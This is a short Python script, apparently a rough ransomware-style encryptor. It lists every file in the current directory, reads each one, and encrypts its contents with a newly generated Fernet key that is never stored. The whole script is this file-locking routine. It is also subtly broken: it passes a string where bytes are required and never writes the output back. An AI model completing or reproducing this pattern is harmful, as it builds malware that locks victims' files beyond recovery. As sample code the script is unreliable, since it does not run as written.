from cryptography.fernet import Fernet
from os import listdir as D
key = Fernet.generate_key()
Pass = Fernet(key)
files = D()
for item in files:
    with open(item, "rb") as f:
        content= f.read()
        Pass.encrypt(f"{content}")
